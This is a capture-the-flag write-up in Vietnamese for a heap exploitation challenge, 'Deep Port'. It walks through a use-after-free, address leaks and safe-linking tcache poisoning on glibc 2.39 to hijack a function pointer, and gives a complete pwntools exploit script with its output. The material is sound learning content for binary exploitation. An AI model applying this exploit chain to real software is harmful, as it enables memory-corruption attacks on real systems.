# Deep Port (Pwn)

## 1. Thông tin tổng quan
- **Category:** Pwn (Binary Exploitation)
- **Difficulty:** Medium/Hard
- **Tags:** Heap, UAF, Tcache Poisoning, Safe-Linking, glibc 2.39, Function Pointer Hijack

## 2. Đề bài
> *(Không lưu lại nguyên văn đề bài từ platform, mô tả dưới đây được viết lại dựa trên hành vi thực tế của chương trình.)*

Chương trình `deep_port` mô phỏng một cảng hàng hoá quản lý các "shipment" (lô hàng) qua các slot. Menu gồm các thao tác: tạo shipment (cấp phát buffer), sửa dữ liệu, xem thông tin (địa chỉ handler + con trỏ buffer), giải phóng (release) shipment, và một lựa chọn "dispatch" gọi tới một con trỏ hàm xử lý mặc định.

Mục tiêu: lấy flag nằm trong `flag.txt`.

**File đính kèm:**
- `deep_port` — ELF 64-bit, PIE, NX enabled, Full RELRO, Canary found, not stripped (có debug_info), chạy trên glibc 2.39.

## 3. Quá trình phân tích

`dispatch()` (menu 7) đơn giản là `harbor->fn(harbor)`, với `harbor` là một struct heap (`malloc(0x48)`, cấp phát ngay từ đầu trong `setup()`) mà `harbor+0x20` là con trỏ hàm (mặc định trỏ tới `standby`, chỉ in banner) và `harbor+0x28` là chuỗi tên file (mặc định `"flag.txt"`). Chương trình cũng có sẵn `print_flag(rdi)`, hàm này `fopen(rdi+0x28)` / `fgets` / `printf` — nếu chiếm được quyền ghi vào `harbor` để đặt `harbor+0x20 = &print_flag`, `dispatch()` sẽ tự động gọi `print_flag(harbor)` và in ra flag mà không cần ROP hay ghi đè GOT gì cả.

Bug nằm ở `release_shipment()` (menu 4): hàm này `free()` buffer của shipment nhưng **không hề NULL lại con trỏ** trong slot — một use-after-free kinh điển. `view_shipment()` (menu 3) thì vô tình là một oracle leak rất mạnh: nó in ra cả `handler` (chính là địa chỉ hàm `standby`, cho ngay PIE base) lẫn địa chỉ buffer thật trên heap. Có heap leak, UAF trở thành công cụ hoàn hảo để dàn dựng tcache poisoning kiểu safe-linking (glibc ≥ 2.32): free hai chunk cùng size liên tiếp để tcache-bin `0x50` có 2 phần tử, rồi dùng UAF ghi đè `fd` (đã bị mangle bằng `(chunk_addr >> 12) ^ target`) của phần tử đầu để trỏ tới `harbor`.

Vì `harbor` được `malloc(0x48)` ngay đầu tiên trong `setup()`, trước cả bất kỳ shipment nào, nó luôn nằm cố định `chunk0 - 0x50` so với shipment đầu tiên (cả hai đều xin `0x48` byte nên rơi vào cùng bin `0x50`) — không cần leak riêng địa chỉ `harbor`, chỉ cần suy ra từ địa chỉ shipment đã leak.

**Hướng giải quyết:**
1. Tạo hai shipment `s0`, `s1` cùng size `0x48` → hai chunk `0x50`.
2. `view(s0)` leak `handler` (→ PIE base, suy ra `print_flag`) và địa chỉ buffer `chunk0` (→ suy ra `harbor = chunk0 - 0x50`).
3. `release(s0)`, `release(s1)` → tcache-bin `0x50` có 2 phần tử, đầu bin là `s1`, trỏ tiếp (`fd`) tới `s0`.
4. `edit(s1)` ghi đè `fd` đã mangle của `s1` thành `(s1 >> 12) ^ harbor` (safe-linking) → giờ bin trỏ `s1 → harbor`.
5. `create(s2)` rút `s1` ra khỏi bin (dữ liệu không quan trọng); `create(s3)` với payload rút đúng chunk `harbor` ra, ghi `harbor+0x20 = print_flag` và `harbor+0x28 = "flag.txt\0"`.
6. `dispatch()` (menu 7) → gọi `print_flag(harbor)` → in flag.

## 4. PoC

```python
#!/usr/bin/env python3
# Deep Port - GuCTF pwn  (glibc 2.39, tcache poisoning via UAF)
#
# Sink: dispatch() (menu opt 7) does  harbor->fn(harbor)  where harbor is a heap
# struct (malloc(0x48) in setup) with:
#     harbor+0x20 = fn  (= standby, prints a banner)
#     harbor+0x28 = "flag.txt"
# print_flag(rdi) fopen(rdi+0x28)/fgets/printf -> if we set harbor+0x20 =
# &print_flag then dispatch() runs print_flag(harbor) and dumps flag.txt.
#
# Vector: release_shipment() (opt 4) free()s a shipment's buffer but never NULLs
# the pointer -> UAF. view_shipment() (opt 3) leaks the buffer's handler pointer
# (= standby, gives PIE) and the buffer address (heap). With a heap leak we can
# forge the safe-linked tcache fd and make malloc hand back the harbor chunk.
#
# harbor is malloc'd first in setup, so it sits exactly 0x50 below the first
# shipment chunk:  harbor = chunk0 - 0x50  (both are 0x48 requests -> 0x50 bins).
#
# Plan:
#   create s0,s1 (size 0x48)                      -> two 0x50 chunks
#   view s0        -> leak PIE (standby) + heap (chunk0); harbor = chunk0-0x50
#   free s0, free s1                              -> tcache[0x50]: s1 -> s0  (n=2)
#   edit s1: fd = (s1>>12) ^ harbor               -> tcache[0x50]: s1 -> harbor
#   create s2 (size 0x48)                         -> malloc returns s1
#   create s3 (size 0x48, payload)                -> malloc returns harbor;
#        payload = 0x20 pad + p64(print_flag) + b"flag.txt\0"
#   dispatch (opt 7)                              -> print_flag(harbor) -> FLAG

from pwn import *

context.binary = ELF('./deep_port', checksec=False)
context.log_level = 'info'

HOST, PORT = '10.112.0.12', 49543

# Bản hand-out là PIE + canary. Remote service là bản build KHÁC: NON-PIE
# (base 0x400000), KHÔNG có stack canary, và có prologue endbr64 (CET). Việc
# này dịch chuyển toàn bộ hàm, nên offset print_flag của bản local không áp
# dụng được cho remote. Đã xác nhận địa chỉ tuyệt đối trên remote (non-PIE,
# cố định) bằng cách leak standby rồi đọc .text qua primitive arbitrary-read
# dựng từ chính UAF này:
#     standby     = 0x4012b6
#     print_flag  = 0x4012d5   (= standby + 0x1f; endbr64;push;sub rsp,0xa0;...)
STANDBY_OFF        = 0x1209    # bản local PIE
PRINTFLAG_OFF      = 0x1247    # bản local PIE
PRINTFLAG_REMOTE   = 0x4012d5  # bản remote non-PIE (địa chỉ tuyệt đối)
HARBOR_DELTA  = 0x50            # chunk0 - harbor
SZ            = 0x48            # size yêu cầu -> rơi vào tcache bin 0x50


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(context.binary.path)


def create(p, slot, size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Slot:', str(slot).encode())
    p.sendlineafter(b'Manifest size:', str(size).encode())
    p.sendafter(b'Manifest data:', data)   # raw read(); chỉ gửi data
    p.recvuntil(b'Docked.')


def edit(p, slot, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Slot:', str(slot).encode())
    p.sendafter(b'New manifest data:', data)
    p.recvuntil(b'Updated.')


def view(p, slot):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Slot:', str(slot).encode())
    p.recvuntil(b'Receipt stamp: ')
    handler = int(p.recvline().strip(), 16)     # = standby -> PIE
    p.recvuntil(b'Manifest pointer: ')
    ptr = int(p.recvline().strip(), 16)         # = địa chỉ buffer trên heap
    return handler, ptr


def release(p, slot):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Slot:', str(slot).encode())
    p.recvuntil(b'released.')


def dispatch(p):
    p.sendlineafter(b'> ', b'7')


def exploit():
    p = start()

    # hai chunk cùng size để tcache-bin 0x50 đạt count 2 sau khi free cả hai
    create(p, 0, SZ, b'AAAA')
    create(p, 1, SZ, b'BBBB')

    # leak handler (= standby) + heap từ slot 0
    handler, chunk0 = view(p, 0)
    if args.REMOTE:
        print_flag = PRINTFLAG_REMOTE          # bản remote non-PIE cố định
    else:
        print_flag = (handler - STANDBY_OFF) + PRINTFLAG_OFF   # bản local PIE
    harbor     = chunk0 - HARBOR_DELTA
    chunk1     = chunk0 + 0x50
    log.success('standby    = %#x', handler)
    log.success('heap chunk0= %#x', chunk0)
    log.success('harbor     = %#x', harbor)
    log.success('print_flag = %#x', print_flag)

    # UAF double free -> tcache[0x50] head = chunk1 (chunk1 -> chunk0)
    release(p, 0)
    release(p, 1)

    # đầu độc fd đã safe-link của head để trỏ tới chunk harbor
    mangled = (chunk1 >> 12) ^ harbor
    edit(p, 1, p64(mangled))

    # rút cạn hai slot đã bị đầu độc: s2 <- chunk1, s3 <- harbor
    create(p, 2, SZ, b'CCCC')
    payload = b'A' * 0x20 + p64(print_flag) + b'flag.txt\x00'
    create(p, 3, SZ, payload)

    # kích hoạt dispatch -> print_flag(harbor) -> đọc flag.txt
    dispatch(p)

    data = p.recvall(timeout=3)
    m = re.search(rb'grodno\{[^}]*\}', data)
    if m:
        log.success('FLAG: %s', m.group().decode())
    else:
        log.info('output:\n%s', data.decode(errors='ignore'))
    p.close()


if __name__ == '__main__':
    exploit()
```

**Output:**
```
[+] Starting local process '/home/caterpie/GuCTF/pwn/deep_port/deep_port': pid 4751
[+] standby    = 0x5e2f77767209
[+] heap chunk0= 0x5e2f78a632f0
[+] harbor     = 0x5e2f78a632a0
[+] print_flag = 0x5e2f77767247
[+] Receiving all data: Done (40B)
[+] FLAG: grodno{fake_flag}
```

## 5. Flag
```
grodno{fake_flag}
```
*(Flag thật đã submit trực tiếp lúc thi qua service của BTC, không lưu lại; giá trị trên chỉ minh hoạ định dạng.)*
